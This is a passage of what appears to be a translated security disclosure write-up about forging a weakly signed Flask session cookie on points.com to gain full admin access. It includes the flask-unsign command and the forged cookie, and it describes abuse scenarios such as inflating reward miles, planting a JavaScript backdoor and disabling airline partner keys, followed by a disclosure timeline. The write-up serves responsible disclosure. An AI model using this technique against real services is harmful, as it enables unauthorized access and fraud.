      "mac_key":"redacted",
      "mac_key_identifier":"redacted",
      "roles":[]
   }
}
```

根據我們在解密後的 cookie 中看到的內容，沒有任何不可預測的東西會阻止我們篡改 cookie
- `roles` 和 `groups` array 似乎最有可能提升權限
- 因為我們現在可以用任何資料重新簽名，所以我們回到 application 中，試圖找到與這些欄位相關的 JavaScript


根據我們在 JavaScript 中找到的訊息
- 權限最高的角色是 `configeditor` role
- 我們將其與 `admin` group 一起新增到 cookie 中，並使用以下命令將其 resigned:


```shell
flask-unsign -s -S "secret" -c "{'_csrf_token': 'bb2cf0e85b20f13dcfebecb436c91b160f392fa2555961c23b3fcc67775edc50', '_fresh': True, '_id': 'a76abcdda16ed36f131df6e5f30c7e9cf142131ebcd4c0706b4c05ec720006daeaef804fcd925743954f10c8a5b3e10018216585157c88e6aedaa8fb42702dd3', '_user_id': '8547961e-b122-4b42-a124-4169cfc86a94', 'sid': 'bd2e7256bf1011eda2410242ac11000a', 'user': {'authenticationType': 'account', 'email': 'samwcurry@gmail.com', 'feature_flags': ['temp_resending_emails', 'v2_manual_bonus_page', 'v2_request_for_reimbursements'], 'groups': ['admin'], 'id': '8547961e-b122-4b42-a124-4169cfc86a94', 'mac_key': 'blLWTn1VyhIWNPoAVC2X9-Iqsqei7pEPkgXjxnhRepg=', 'mac_key_identifier': '8d261003b476497e8be4c2c077d69b5f', 'roles': [{'role': 'https://lcp.points.com/v1/roles/configeditor'}]}}"
```


該命令使用 `"secret"` key resigne 我們的 cookie，並給出了下面的 cookie:

```
session=.eJy9U01r3DAU_C8-x1lJ1oe9UOgSegiUsrQhCZRg9PG0665tOZKcdgn5733eHAKFQLeHniw_zcwbzZOei9am6NscDjAW68IYZj2BWhhGPK2c9WDAGl5J21BDJfFVw7xmQohGUssqU3lrpVJKgLOCFBdF6yOkfbHOcQb86xzKaiW1sc5pKsFVEpWp8xKEr4hV0FhPOcMaIIZboog0-BFgFSOESKdBg68J99Y1TCheNYJ7SmythamAEkJrRqWoBRXK1jVIDU7r2hvOFGHOVYutOUF8dVMLrtA9lIYyVnJElZoyXnIq0YqtpW44MtIJbBwDxYQ02JBS1GWcEsaZthQbE43ARblYPxd6znsYc2d17sJ4c5xgObq1YR4zwmDQXY-VpIefdo7x-HEK3ZjTpQ0DbnvQeY7Q-l7vUrH-XmQYphazhNF146490RMCn1g76HHWfWvCOKd20jt4LUd4nCHl1oeI624wc0wwoKVUPFwUuxjm6aR8FcYUetikba8zgoeNG7pxwZyTz6Bte4DjklH_-e5mpLfH_fXdl23Y3F6x-6a8fkyP0Knp0_awu__xa9x_hWn34Y2Iw1jS8t2SXlE7JjHQynAleaOgNsAtw8ugnGyM8MiL6Hnx_3xaIWef85TWq1Vvp8u3LFdPdHWCriJoV4axPxYvF39NeiecMxS2p9pmmr7N0xRiPoerp6lM59P6f2LZOeUwQPx_HQcdD5DxOuOTeeosJBtG3-0gpnNUTAgH1IiwtF-G_Af_vRE-vLz8BnvIpoE.ZFDJgQ.Lld9KeetbZJ_KBeLI2KOHB7EnaA
```


插入 cookie 後，我們嘗試重新造訪了 `console.points.com` 網站，並看到了許多額外的功能
- 我們已經進入，並擁有完全的管理權限！
- 其中一個頁面立即引起了我們的注意，那就是 `Manual Bonus`
- 我們發現它可以將任何計劃的獎勵積分手動新增到任何獎勵帳號中。中獎了！

  

![](https://lh6.googleusercontent.com/ZFftoCl45kcaY_ELwtZAgYUD6_Mq6o3yC2NC9qY0qdArevt-f-qnEHDz3ytY1VUvQXifAnvGR6ReL_wVYGjHMgRP5qZszRUS7kSHwgj21P5fLC10qLc6Vo4WVIA_dvrbA2WFeFUrehE1KUtIkCjPVe8)  



點選 Loyalty Platform 側邊欄按鈕後，我們也可以造訪 `admin-loyaltywallet.points.com` 網站
- 網站還有更多功能，讓我們可以透過使用者姓名、會員 ID 或電子郵件地址等查詢使用者


![](https://lh5.googleusercontent.com/WimzXaYwwH6kb4qUaolMJBp6jk8VpBOc7kxq-MYTrHqU9wIq3B0QtwEFw52LL4LlOzeMXDF6yF0J-ZJHTCy2snEBVi7sB-oXQPeaai775galLRq3-pZpjF4_j3TCRbaQLWLGu7dH6f1LZ3nZ1LyKS78)  


其他 tab 包括 config 和 experiment management:  

![](https://lh6.googleusercontent.com/vI4a6-ACEWD2MUboLdzBvhvgEkynUYqL-YTdxUKlxaKWF4MAyzT49Y-V1CEz90e3W3qF9scudpTsgwQDxZRCeTF47ByISQhw6rTp89ya-R4klgjw3zXECD8BISUYQUuj8RNsM6WDEB9HsL65KP27brY)  


另個有趣的功能是可以透過 `Promos` tab 修改獎勵兌換金額
- 例如，我們可以更新獎勵計劃，用 1 達美航空哩程兌換 1 億美聯航哩程
- 或用在特定方案上每消費 1 美元兌換 100 萬哩程，獲得幾乎無限的里程數


![](https://lh3.googleusercontent.com/yk2oAY84YQYwwKN-fceFIa9546bI_uQI2Q6Pi5X4STJAwosKrMwpYwWISyxXMBJlexm88PW3n_dEIUqb0dYNdiaZdDsoQVJs1dvTpxYHDTPEmeGqjpnvx_upw3hGKCrqyYuAz2_vfYJSZwB7IP4-so8)  

在 user management 方面，可以查看、更新或刪除使用者帳號。 還可以查看帳號的所有歷史記錄、連線和會員資格
 
![](https://lh3.googleusercontent.com/ICwCnMoQTmWw3iUfCVV9_CqIGlStlwsWkpqePJJ80vza80VuGC7DmMhNkAhl5GDULYh1i_gU4Iw8ZFAuUMfgk0Tblz4wJkd5rdwoi5HzddaqRapazmaLA6qPP25EYNhCeIA3fKIO4cVXbjJHiqIVBYY)  



在 `console.points.com` 網站上還有兩個有趣的頁面
- 即 Modules 和 Routes endpoints
- 攻擊者可按計畫將惡意 JavaScript 新增至 administration panel 上的每個頁面
- 如果不被發現，這將是一個超級有趣的後門，攻擊者的 JavaScript 將載入到 administration panel 的每個頁面上

![](https://lh6.googleusercontent.com/z61AO9a1akReYT7rjrIvtx2Spqjiiexf-QFuV0MpXq9_XunpAVSvINUN3LwoHcyfACCRCEUhs1TrT84nC_E01IecU20LKd1FZ5CcndQgSaO0_CUDaT44WuqA4bihgWiLINriaOsebPFXEL2wNdsR0Ac)  

由於這些都是 production rewards customers
- 攻擊者可以透過修改 Platform Partners endpoint 上各航空公司使用的 key 對，暫時關閉所有獎勵旅行
- 一旦 MAC ID 和 MAC key 被覆蓋，就會破壞航空公司用於與 `points.com` 通訊的基礎設施，戶將無法使用航空公司里程預訂機票
 


![](https://lh5.googleusercontent.com/dnArZrAOy4EUoOCO4vTLWg-W8IujzlPTufVoBxK4vHlXMarwAdh27-CrVWGXTwUzaGs4GaXawlINWdkUKdZ-ZiPpmSO-U2r2KtNJp2E7Q-B9BWmbudzOp7WijD3cuy_U0_pJSmh7ZIBe19NS6ijPAVU)  


值得注意的是，該 administration panel 是為 `points.com` 員工建立的，用於管理租戶等級的獎勵計劃
- 擁有這種存取權限的攻擊者可以撤銷實際航空公司為客戶提供服務時使用的存取 API 的憑證，從而關閉該特定航空公司的全球獎勵旅行
- 除了存取客戶帳號資訊外。 惡意攻擊者可能會在許多有趣的場景中濫用這種存取權限


我們報告了這個漏洞，`points.com` 團隊幾乎立即做出了回應
- 儘管我們的郵件是在美國中部時間凌晨 3:26 發送的
- 團隊了解報告的嚴重性，立即關閉了 `console.points.com` 網站
- 我們試圖繞過他們透過 `vhost` 跳轉原 server IP 進行的修復，但沒有成功。網站被完全關閉，問題很快就得到了修復

----------------


## 結尾
在向 `points.com` 團隊提交上一份報告後
- 總體發現允許我們訪問全球大部分獎勵計劃的客戶訊息，代表客戶轉移積分，並最終訪問 global administration panel
- 我們向 `points.com` 安全團隊報告了所有問題，他們很快就修補了這些問題，並與我們合作創建了此披露


披露時間表
- 2023/03/08: 報告的萬裡長城竊盜和 PII 揭露漏洞 (#1)
- 2023/03/08: points.com 回應承認此問題
- 2023/03/09: 發送有關如何升級 3 月 8 日發現問題的附加資訊 (#2)
- 2023/03/09: 來自 points.com 的回复，網站已下線
- 2023/03/29: 收到 points.com 關於全面修復的電子郵件
- 2023/03/29: 發送驗證全面修復的回复
- 2023/04/29: 報告美聯航授權繞過 (#3)
- 2023/04/29: 收到 points.com 的回复，網站已下線
- 2023/05/02: 寄送維珍證書外洩報告 (#4)
- 2023/05/02: 來自 points.com 的回复，端點已刪除
- 2023/05/02: 發送 Flask 會話 Cookie 弱的報告(＃5)
- 2023/05/02: 來自 points.com 的回應，網站下線
- 2023/08/03: 揭露